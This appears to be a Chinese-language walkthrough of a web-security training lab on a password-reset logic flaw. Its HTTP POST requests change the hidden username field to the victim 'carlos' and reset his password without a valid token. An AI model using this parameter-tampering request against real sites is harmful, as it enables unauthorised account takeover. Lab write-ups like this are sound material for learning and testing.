# 实验：密码重置逻辑缺陷

本实验的密码重置功能存在漏洞。为了解决本实验，请重置 Carlos 的密码，然后登录并访问他的“我的账户”（My account）页面。

-   你的凭据：`wiener:peter`
-   受害者的用户名：`carlos`

## 步骤

探测
- 常规使用忘记密码功能
    - 邮箱收到重置密码链接
    - 访问链接得到密码修改表单
        ```html
        <form class=login-form method=POST>
            <input required type=hidden name=temp-forgot-password-token value=qu5yzdqjmug6vg1sk6j3eods4sy9q7dr>
            <input required type=hidden name=username value=wiener>
            <label>New password</label>
            <input required type=password name=new-password-1>
            <label>Confirm new password</label>
            <input required type=password name=new-password-2>
            <button class='button' type='submit'> Submit </button>
        </form>
        ```
        - 此处用户名设置为隐藏参数一并提交
            - 若尝试篡改用户名如何？

    - 输入新密码后提交修改
        ```http
        POST /forgot-password?temp-forgot-password-token=kqdry43ew3uuvvs1ob1v2qkv2wiy75r0 HTTP/2

        temp-forgot-password-token=kqdry43ew3uuvvs1ob1v2qkv2wiy75r0&username=wiener&new-password-1=a&new-password-2=a
        ```

- 得到新的忘记密码令牌后，尝试篡改用户名参数为目标用户
    ```http
    POST /forgot-password?temp-forgot-password-token=216nrlkwoosobq5te7suy0xx38ez3pmv HTTP/2

    temp-forgot-password-token=216nrlkwoosobq5te7suy0xx38ez3pmv&username=carlos&new-password-1=a&new-password-2=a
    ```
    - 似乎成功。
    - 尝试使用修改后的密码登录目标用户账户，成功


示例解决方案
- 忘记密码令牌并未被验证，而可直接删除
